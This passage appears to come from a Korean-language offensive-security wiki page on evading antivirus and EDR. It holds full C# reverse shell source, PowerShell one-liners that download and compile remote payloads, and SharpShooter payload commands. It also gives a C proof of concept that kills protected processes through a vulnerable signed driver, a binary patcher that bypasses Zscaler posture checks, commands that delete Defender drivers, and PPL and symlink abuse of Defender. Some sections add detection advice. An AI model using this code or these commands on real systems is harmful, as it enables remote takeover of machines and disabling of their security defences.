{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# 컴파일러 사용

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python을 사용한 injector 빌드 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### 더 보기

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## 취약한 드라이버 가져오기(BYOVD) – 커널 공간에서 AV/EDR 종료하기

Storm-2603은 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 활용해 랜섬웨어를 투하하기 전에 엔드포인트 보호 기능을 비활성화했습니다. 이 도구는 **자체적인 취약하지만 *서명된* 드라이버**를 가져와 권한이 높은 커널 작업을 수행하는 데 악용합니다. Protected-Process-Light(PPL) AV 서비스조차 이를 차단할 수 없습니다.<sup>[[12]](#references)</sup>

핵심 요점
1. **서명된 드라이버**: 디스크에 전달되는 파일은 `ServiceMouse.sys`이지만, 실제 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명 드라이버 `AToolsKrnl64.sys`입니다. 드라이버에 유효한 Microsoft 서명이 있으므로 Driver-Signature-Enforcement(DSE)가 활성화된 상태에서도 로드됩니다.
2. **서비스 설치**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   첫 번째 줄은 driver를 **kernel service**로 등록하고, 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`에 user land에서 접근할 수 있게 합니다.
3. **driver가 노출하는 IOCTL**
   | IOCTL code | 기능                                    |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID로 임의의 프로세스를 종료합니다(Defender/EDR 서비스를 종료하는 데 사용) |
   | `0x990000D0` | 디스크의 임의 파일을 삭제합니다 |
   | `0x990001D0` | driver를 언로드하고 service를 제거합니다 |

   최소 C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **작동하는 이유**: BYOVD는 user-mode 보호를 완전히 우회합니다. kernel에서 실행되는 코드는 PPL/PP, ELAM 또는 기타 hardening 기능과 관계없이 *protected* 프로세스를 열거나 종료하고, kernel 객체를 변조할 수 있습니다.

탐지 / 완화
• Microsoft의 취약한 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화해 Windows가 `AToolsKrnl64.sys`를 로드하지 않도록 합니다.
• 새로운 *kernel* 서비스의 생성을 모니터링하고, world-writable 디렉터리에서 드라이버가 로드되거나 허용 목록에 없는 경우 경고를 발생시킵니다.
• 사용자 모드 핸들이 사용자 지정 device object에 연결된 후 의심스러운 `DeviceIoControl` 호출이 발생하는지 감시합니다.

### 디스크에 있는 바이너리 패칭을 통한 Zscaler Client Connector Posture 검사 우회

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하며, 결과를 다른 구성 요소와 전달할 때 Windows RPC에 의존합니다. 두 가지 취약한 설계 선택으로 인해 완전한 우회가 가능합니다.

1. Posture 평가는 **전적으로 클라이언트 측에서** 수행됩니다(서버에는 boolean 값이 전송됨).
2. 내부 RPC 엔드포인트는 연결하는 실행 파일이 **Zscaler에서 서명되었는지만** 검증합니다(`WinVerifyTrust` 사용).<sup>[[11]](#references)</sup>

**디스크에 있는 서명된 바이너리 네 개를 패칭**하면 두 메커니즘을 모두 무력화할 수 있습니다.

| 바이너리 | 패칭되는 기존 로직 | 결과 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환해 모든 검사를 준수 상태로 처리 |
| `ZSAService.exe` | `WinVerifyTrust` 간접 호출 | NOP 처리 ⇒ 서명되지 않은 프로세스를 포함한 모든 프로세스가 RPC 파이프에 연결 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체 |
| `ZSATunnel.exe` | 터널의 무결성 검사 | 우회 처리 |

최소 패처 발췌:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

원본 파일을 교체하고 서비스 스택을 다시 시작한 후:

* **모든** posture check가 **green/compliant**로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리도 명명된 파이프 RPC 엔드포인트(예: `\\RPC Control\\ZSATrayManager_talk_to_me`)를 열 수 있습니다.
* 침해된 호스트는 Zscaler 정책에 정의된 내부 네트워크에 제한 없이 액세스할 수 있습니다.

이 사례 연구는 몇 바이트를 패치하는 것만으로 클라이언트 측의 신뢰 결정과 단순한 서명 검사를 무력화할 수 있음을 보여 줍니다.

## Microsoft Defender `BTR.sys` 신뢰된 기능 악용

Defender의 **Boot-Time Removal** 드라이버는 기존 BYOVD와 대조되는 유용한 사례입니다. `BTR.sys`는 메모리 손상 버그와 IOCTL 인터페이스가 없는, Microsoft가 서명한 합법적인 복구 구성 요소입니다. 관리자 액세스와 `SeLoadDriverPrivilege`를 획득한 후에는, 공격자가 대신 비공개 복구 트랜잭션을 위조해 의도된 Ring-0 파일/레지스트리 작업을 수행할 수 있습니다. 이는 **침해 후 AV/EDR 무력화 프리미티브이며, 초기 액세스나 권한 상승이 아닙니다**. 또한 눈에 띄는 타사 드라이버를 가져오는 대신 대상 자체의 `MpEngine.dll`에 있는 `BOOTTIMETOOL` 리소스에서 드라이버를 추출할 수 있습니다.<sup>[[36]](#references)</sup>

### 일회성 드라이버 준비

Defender는 일반적으로 리소스를 임의의 `[a-z]{8}.sys` 파일로 추출하고, 이름이 비슷한 커널 서비스를 등록합니다. `DriverEntry`는 서비스의 `Args` 값을 읽고, 참조된 NTFS ADS를 열어 작업 목록을 복호화하고 검증한 뒤, 피드백을 기록합니다. 작업이 성공적으로 실행되면 드라이버는 상주하지 않고 언로드되도록 `0xC0000056` (`STATUS_DELETE_PENDING`)을 반환합니다. 위조된 서비스에는 다음과 같은 특징적인 값이 있습니다.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` 스트림에는 RC4로 암호화된 blob 하나가 포함됩니다. 분석된 빌드에서는 고정된 256바이트 키를 재사용하므로, 암호화는 권한 부여 경계가 아닙니다. 유효한 평문은 24바이트 전역 헤더(`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, 헤더 CRC 및 페이로드에서 파생된 트랜잭션 ID)로 시작하고, 그 뒤에 null로 끝나는 UTF-16 피드백 경로와 임의 개수의 항목이 옵니다. 각 항목은 16바이트 헤더(`DataSize`, `Action`, `HeaderCRC`, `DataCRC`)와 액션별 데이터로 구성되며, 데이터는 **정확히 네 개의 NUL 바이트**로 끝납니다. 각 헤더/데이터 영역은 CRC-32 다항식 `0xEDB88320`, 초기 상태 `0xFFFFFFFF`, **최종 XOR 없음**(`~CRC32`)으로 독립적으로 검증되며, 각 영역마다 CRC 상태가 초기화됩니다.<sup>[[36]](#references)[[37]](#references)</sup>

허용되는 액션 ID는 다음 커널 프리미티브를 노출합니다.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | 항목 데이터 | 결과 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | 잠긴 파일을 포함해 파일 삭제 |
| 2 | `[UTF-16 path]` | 비어 있는 디렉터리 제거 |
| 3 | `[Flags][source][destination]` | 공격자가 선택한 보호 경로로 파일 이동; destination이 비어 있으면 삭제 |
| 4 | `[Flags][key path]` | 레지스트리 키 재귀 삭제 |
| 5 | `[Flags][key path + "\\" + value]` | 레지스트리 값 삭제 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | 레지스트리 값 생성/업데이트 및 누락된 키 경로 생성 |

액션 5와 6의 경우, wire 형식에서 키/값 구분자는 **연속된 백슬래시 두 개**입니다. 일반적인 형식의 경로는 올바르게 분리되지 않습니다. 피드백 파일은 대부분 요청을 그대로 반영하지만, 각 항목의 처음 네 데이터 바이트는 해당 항목의 결과 `NTSTATUS`가 됩니다. 선행 flags 필드가 없는 액션 1과 2에서는 BTR이 경로를 네 개의 예약된 후행 바이트로 이동해 해당 상태값을 넣을 공간을 확보합니다.<sup>[[36]](#references)</sup>

### `BTR_CLI` 워크플로 및 초기 부팅 구간

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)는 전체 체인을 구현합니다. 로컬 Defender에서 `BTR.sys`를 추출하고, `<random>.sys:changelist`와 피드백 스트림을 생성하며, 연결된 액션을 직렬화/체크섬 처리/암호화하고, 서비스 레지스트리 키를 직접 생성한 다음, `-trigger now`의 경우 `NtLoadDriver`를 호출하거나 `-trigger boot`의 경우 시스템 시작 드라이버로 남겨 둡니다. 레지스트리에 직접 스테이징하면 일반적인 SCM `CreateServiceW` 경로를 거치지 않으므로 서비스 설치 Event ID 7045가 생성되지 **않습니다**. 부팅 트리거 아티팩트는 나중에 `BTR_CLI.exe -cleanup <service_name>`으로 제거할 수 있습니다.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0`은 사용할 수 없습니다. BTR이 storage stack과 `SystemRoot` link가 준비되기 전에 `DriverEntry`에서 파일 I/O를 수행하기 때문입니다. 높은 우선순위의 `Boot Bus Extender` 그룹과 함께 `Start=1`을 설정하면 Phase 1에서 실행됩니다. 이때 NTFS는 사용할 수 있지만, 많은 system-start 보안 드라이버와 user-mode EDR 서비스는 아직 초기화되지 않았습니다. `WdFilter` 같은 boot-start filter가 이미 로드되었을 수 있지만, BTR은 다음 시작 전에 해당 파일이나 service configuration을 제거할 수 있으며, SCM이 service executable을 시작하기 전에 이를 삭제할 수도 있습니다. BTR은 boot-start 평가가 끝난 뒤 실행되고 유효한 Microsoft 서명을 포함하므로 ELAM으로도 이 공백을 막을 수 없습니다.<sup>[[36]](#references)</sup>

여러 작업이 하나의 transaction에서 실행됩니다. PoC는 하드코딩된 `\SystemRoot\Temp\BootClean.log`에 대해 Action 1을 앞에 추가합니다. BTR은 이 로그를 생성한 뒤 자체 삭제 요청을 처리하고 unload 전에 로그를 제거합니다. 이로써 흔적을 줄일 수 있으며, 피드백을 `<random>.sys:<random>.dat`에 저장하면 드라이버와 두 stream을 함께 제거할 수 있습니다.<sup>[[36]](#references)[[37]](#references)</sup>

### High-signal detection correlations

서명만 확인하는 규칙과 Microsoft vulnerable-driver blocklist는 의도된 BTR 기능의 악용을 다루지 못합니다. 임의의 launcher와 정당한 Defender lineage를 구분하면서 다음 behavioral correlation을 우선 적용하세요.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` 생성은 모든 BTR staging에 공통으로 나타납니다. 동일한 `.sys`에 연결된 `.dat` ADS는 특히 의심스럽습니다. 정상적인 Defender는 보통 `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 아래에 피드백을 저장하기 때문입니다.
- **Sysmon 12/13 without System 7045:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>`에 `Args=...:changelist`와 `Group=Boot Bus Extender`가 포함된 항목이 직접 생성되었는지 확인하고, 일치하는 SCM 설치 이벤트가 없는 경우 이를 연관 분석하세요.
- **Sysmon 6 -> 23:** Defender와 무관한 lineage에서 알려진 BTR driver가 로드된 후, 특히 보안 바이너리와 관련해 `System`/PID 4에 귀속된 파일 삭제가 발생했는지 연관 분석하세요.
- **Sysmon 11 -> 23:** `System`/PID 4가 `\SystemRoot\Temp\BootClean.log`를 생성한 직후 삭제하는 경우 경보를 발생시키세요.
- `SeLoadDriverPrivilege`의 할당 및 활성화를 제한하고 감사하세요. `cmd.exe`, PowerShell 또는 알 수 없는 프로세스가 보안 도구 드라이버를 staging하는 경우, Microsoft 서명만으로는 신뢰하기에 충분하지 않습니다.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL)는 서명자/수준 계층 구조를 적용하여 보호 수준이 같거나 더 높은 프로세스만 서로를 변조할 수 있게 합니다. 공격 관점에서는 PPL이 활성화된 바이너리를 정당한 방식으로 실행하고 인수를 제어할 수 있다면, 로깅 같은 무해한 기능을 AV/EDR이 사용하는 보호 디렉터리에 쓰는 제한된 PPL 기반 primitive로 전환할 수 있습니다.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

프로세스를 PPL로 실행하는 조건
- 대상 EXE와 로드되는 모든 DLL은 PPL을 지원하는 EKU로 서명되어야 합니다.
- `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` 플래그를 사용하여 CreateProcess로 프로세스를 생성해야 합니다.
- 바이너리 서명자와 일치하는 호환 가능한 보호 수준을 요청해야 합니다(예: anti-malware 서명자의 경우 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자의 경우 `PROTECTION_LEVEL_WINDOWS`). 잘못된 수준을 지정하면 생성에 실패합니다.

PP/PPL 및 LSASS 보호에 관한 보다 폭넓은 소개는 다음을 참조하세요.

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher 도구
- 오픈 소스 helper: CreateProcessAsPPL (보호 수준을 선택하고 인수를 대상 EXE에 전달):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 사용 패턴:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 자체적으로 새 프로세스를 실행하며, 호출자가 지정한 경로에 로그 파일을 쓰는 매개변수를 받습니다.
- PPL 프로세스로 실행하면 PPL 권한으로 파일 쓰기가 수행됩니다.
- ClipUp은 공백이 포함된 경로를 파싱하지 못합니다. 일반적으로 보호되는 위치를 지정하려면 8.3 short path를 사용하세요.

8.3 short path 도우미
- 짧은 이름 목록 확인: 각 상위 디렉터리에서 `dir /x`를 실행합니다.
- cmd에서 짧은 경로 확인: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

악용 체인 (개요)
1) 실행기(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 PPL을 지원하는 LOLBIN(ClipUp)을 실행합니다.
2) ClipUp 로그 경로 인수를 전달해 보호된 AV 디렉터리(예: Defender Platform)에 파일을 생성하도록 합니다. 필요하면 8.3 short name을 사용합니다.
3) 대상 바이너리가 실행 중 AV에 의해 일반적으로 열려 있거나 잠겨 있는 경우(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기가 수행되도록 더 먼저 안정적으로 실행되는 자동 시작 서비스를 설치합니다. Process Monitor(boot logging)로 부팅 순서를 확인합니다.
4) 재부팅 시 PPL 권한으로 파일을 쓰는 작업이 AV가 해당 바이너리를 잠그기 전에 수행되어 대상 파일이 손상되고 AV가 시작되지 않습니다.

실행 예시 (안전을 위해 경로를 가리거나 짧게 표시):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

참고 사항 및 제약
- ClipUp이 기록하는 내용은 배치 위치 외에는 제어할 수 없습니다. 이 기법은 정밀한 콘텐츠 삽입보다는 손상에 적합합니다.
- 서비스를 설치/시작하려면 로컬 관리자/SYSTEM 권한과 재부팅 가능한 시간이 필요합니다.
- 타이밍이 중요합니다. 대상 파일이 열려 있으면 안 되며, 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

탐지
- 부팅 전후로 비정상적인 인수, 특히 비표준 실행 프로그램을 부모 프로세스로 둔 `ClipUp.exe` 프로세스 생성 여부를 확인합니다.
- 의심스러운 바이너리를 자동 시작하도록 구성된 새 서비스와 Defender/AV보다 먼저 일관되게 시작되는 서비스가 있는지 확인합니다. Defender 시작 실패 전에 서비스가 생성/수정되었는지 조사합니다.
- Defender 바이너리/Platform 디렉터리의 파일 무결성을 모니터링합니다. 보호 프로세스 플래그를 사용하는 프로세스가 예상치 못하게 파일을 생성/수정했는지 확인합니다.
- ETW/EDR 텔레메트리에서 `CREATE_PROTECTED_PROCESS`로 생성된 프로세스와 AV가 아닌 바이너리의 비정상적인 PPL 수준 사용을 확인합니다.

완화
- WDAC/Code Integrity를 사용해 PPL로 실행할 수 있는 서명된 바이너리와 허용되는 부모 프로세스를 제한하고, 정상적인 컨텍스트가 아닌 경우 ClipUp 실행을 차단합니다.
- 서비스 관리: 자동 시작 서비스의 생성/수정을 제한하고 시작 순서 조작을 모니터링합니다.
- Defender 변조 방지와 조기 실행 보호가 활성화되어 있는지 확인하고, 바이너리 손상을 나타내는 시작 오류를 조사합니다.
- 환경과 호환되는 경우 보안 도구가 있는 볼륨에서 8.3 짧은 이름 생성을 비활성화하는 방안을 고려합니다(철저히 테스트하세요).

## Platform 버전 폴더 Symlink 하이재킹을 통한 Microsoft Defender 변조

Windows Defender는 다음 경로의 하위 폴더를 열거해 실행할 Platform을 선택합니다.
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 높은 사전식 버전 문자열(예: `4.18.25070.5-0`)을 가진 하위 폴더를 선택한 다음, 해당 경로에서 Defender 서비스 프로세스를 시작합니다(서비스/레지스트리 경로도 그에 맞게 업데이트). 이 선택 과정은 디렉터리 재분석 지점(symlink)을 포함한 디렉터리 항목을 신뢰합니다. 관리자는 이를 악용해 Defender가 공격자가 쓰기 가능한 경로를 참조하도록 리디렉션하고 DLL sideloading 또는 서비스 중단을 일으킬 수 있습니다.<sup>[[21]](#references)[[22]](#references)</sup>

사전 조건
- 로컬 관리자 권한(Platform 폴더 아래에 디렉터리/symlink를 만들기 위해 필요)
- 재부팅하거나 Defender Platform 재선택을 유발할 수 있는 권한(부팅 시 서비스 재시작)
- 기본 제공 도구만 필요(`mklink`)

작동 원리
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, Platform 선택 과정에서는 디렉터리 항목을 신뢰하고 대상이 보호되거나 신뢰된 경로로 연결되는지 확인하지 않은 채 사전식으로 가장 높은 버전을 선택합니다.

단계별 절차(예시)
1) 현재 Platform 폴더의 쓰기 가능한 복제본을 준비합니다. 예: `C:\TMP\AV`
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 안에 자신의 폴더를 가리키는 더 높은 버전의 디렉터리 symlink를 생성합니다:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택(재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인하세요:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 있고 서비스 구성/레지스트리에 해당 위치가 반영되어 있는지 확인해야 합니다.

Post-exploitation options
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 배치/교체하여 Defender 프로세스에서 코드를 실행합니다. 위 섹션을 참조하세요: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: 버전 심볼릭 링크를 제거하여 다음 시작 시 구성된 경로가 확인되지 않게 하고 Defender가 시작되지 못하도록 합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> 이 기법만으로는 권한 상승이 이루어지지 않습니다. 관리자 권한이 필요합니다.

## PIC를 사용한 API/IAT 후킹 + Call-Stack Spoofing (Crystal Kit 스타일)

레드팀은 대상 모듈의 Import Address Table (IAT)을 후킹하고, 선택한 API를 공격자가 제어하는 position-independent code (PIC)로 라우팅하여 runtime evasion을 C2 implant에서 대상 모듈 자체로 옮길 수 있습니다. 이 방식은 많은 kit에서 제공하는 제한적인 API 범위(예: CreateProcessA)를 넘어 evasion을 일반화하고, 같은 보호를 BOF와 post-exploitation DLL에도 적용합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

상위 수준 접근 방식
- reflective loader를 사용해 대상 모듈과 함께 PIC blob을 배치합니다(prepended 또는 companion 방식). PIC는 자체적으로 완결되어 있고 position-independent여야 합니다.
- 호스트 DLL이 로드될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하고, 대상 import(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)의 IAT 항목을 얇은 PIC wrapper를 가리키도록 수정합니다.
- 각 PIC wrapper는 실제 API 주소를 tail-call하기 전에 evasion을 수행합니다. 일반적인 evasion에는 다음이 포함됩니다.
  - 호출 전후의 memory mask/unmask(예: beacon 영역 암호화, RWX→RX 변경, 페이지 이름/권한 변경 후 호출이 끝나면 복원).
  - Call-stack spoofing: 정상적인 스택을 구성하고 대상 API로 전환하여 call-stack 분석에서 예상된 프레임이 확인되도록 합니다.<sup>[[9]](#references)</sup>
- 호환성을 위해 Aggressor script(또는 이에 준하는 도구)가 Beacon, BOF, post-ex DLL에서 후킹할 API를 등록할 수 있도록 인터페이스를 export합니다.

여기서 IAT 후킹을 사용하는 이유
- 후킹된 import를 사용하는 모든 코드에 적용되므로, 도구 코드를 수정하거나 Beacon이 특정 API를 proxy하도록 할 필요가 없습니다.
- post-ex DLL도 지원합니다. LoadLibrary*를 후킹하면 모듈 로드(예: System.Management.Automation.dll, clr.dll)를 가로채고, 해당 모듈의 API 호출에도 같은 masking/stack evasion을 적용할 수 있습니다.
- CreateProcessA/W를 wrapper로 감싸 call-stack 기반 탐지를 우회하면서 프로세스 생성 post-ex 명령을 안정적으로 사용할 수 있습니다.

최소 IAT 후킹 예시 (x64 C/C++ 의사 코드)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
참고 사항
- relocation/ASLR 적용 후, import를 처음 사용하기 전에 패치를 적용합니다. TitanLdr/AceLdr 같은 reflective loader는 로드된 모듈의 DllMain에서 hooking하는 방식을 보여 줍니다.
- wrapper는 작고 PIC-safe하게 유지합니다. 패치 전에 캡처한 원래 IAT 값이나 LdrGetProcedureAddress를 통해 실제 API를 확인합니다.
- PIC에는 RW → RX 전환을 사용하고, writable+executable 페이지를 남기지 않습니다.

Call-stack spoofing stub
- Draugr 스타일의 PIC stub은 가짜 call chain(benign 모듈 내부의 return address)을 만든 다음 실제 API로 이동합니다.
- 이 방식은 Beacon/BOF에서 민감한 API로 이어지는 canonical stack을 기대하는 탐지를 우회합니다.
- stack cutting/stack stitching 기법과 함께 사용해 API prologue에 도달하기 전에 예상되는 frame 안에 위치시킵니다.

운영 통합
- reflective loader를 post-ex DLL 앞에 추가해 DLL이 로드될 때 PIC와 hook이 자동으로 초기화되도록 합니다.
